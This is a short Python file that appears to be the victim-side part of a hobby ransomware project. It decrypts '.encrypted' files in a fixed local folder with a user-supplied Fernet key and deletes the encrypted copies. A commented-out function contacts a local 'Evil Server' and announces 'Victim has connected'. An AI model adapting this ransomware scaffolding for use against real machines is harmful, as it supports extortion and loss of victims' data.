from gzip import _GzipReader
from cryptography.fernet import Fernet
import os
import socket



def TakeTheKey():
    global inputkey
    global inputkeybytes
    inputkey = input("Enter the key")
    inputkeybytes = bytes(inputkey, 'utf-8')
    

def LocateandDecrypt():
    for fileonsys in os.listdir('/home/abis/Desktop/project'):
        if fileonsys.endswith(".encrypted"):
            print(os.path.join("", fileonsys))

            filenames = os.path.join("", fileonsys)
            
            with open(filenames, 'rb') as encfiles:
                encryptedstuff = encfiles.read()

            keytoDecrypt = Fernet(inputkeybytes)

            decryptedinfo = keytoDecrypt.decrypt(encryptedstuff)
            
            with open(filenames.rsplit( ".", 1 )[ 0 ], 'wb') as createDecrypted:
                createDecrypted.write(decryptedinfo)

    for fileonsys in os.listdir('/home/abis/Desktop/project'):
        if fileonsys.endswith(".encrypted"):
            os.remove(fileonsys)



def NewConnection():
    connection = socket.socket()
    connection.connect(('127.0.0.1',1000))
    while True:
        somedata = "Victim has connected"
        connection.send(somedata.encode())
        chatdata = input("connection: ")
        connection.send(chatdata.encode());
        if(chatdata == "exit"):
            break
        print( "Evil Server:",connection.recv(1024).decode())
    connection.close()



#NewConnection()
TakeTheKey()
LocateandDecrypt()